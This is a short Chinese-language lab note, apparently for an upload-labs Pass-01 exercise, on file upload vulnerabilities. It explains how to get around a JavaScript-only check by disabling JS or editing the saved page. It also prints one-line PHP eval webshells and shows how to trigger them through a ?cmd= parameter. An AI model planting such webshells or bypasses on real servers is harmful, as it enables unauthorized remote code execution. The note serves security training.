文件上传漏洞

文件上传漏洞是指服务器未充分校验用户上传文件的类型、内容或大小，导致攻击者可上传恶意脚本（如Webshell）并远程执行，从而控制服务器。

文件上传绕过检测：

  • 操作系统漏洞
  • Apache解析漏洞
  • 图片木马

到此为止发现Pass-01做的是前端校验，完全在浏览器端用 JS 完成，服务端没有做任何文件类型检查。

checkFile() 只在表单 onsubmit 时触发，绕过前端校验后，服务端照单全收。

绕过方法如下：

（1）禁用JS渲染

浏览器 F12 → Settings → 禁用JavaScript，直接上传 webshell

（2）改前端代码

ctrl+s 下载源码（静态网站），在编辑器里打开，添加action=目标url（因为在原网页中post默认提交给当前页面，即目标url，这里在自己的静态页面下需要指定上传到哪个url）

然后改代码判断逻辑或者改js函数，让输出为true即可

补充

一句话木马可以写 <?php @eval($_GET['cmd']); ?> 或 <?php @eval($_REQUEST['cmd']); ?>

然后可以直接在 url 栏里 ?cmd=phpinfo(); 用Get请求获取信息

此处必须加分号，因为php不像HTML和JavaScript会自动补全分号，而eval()函数更没有自动补全功能，必须写出完整php语句
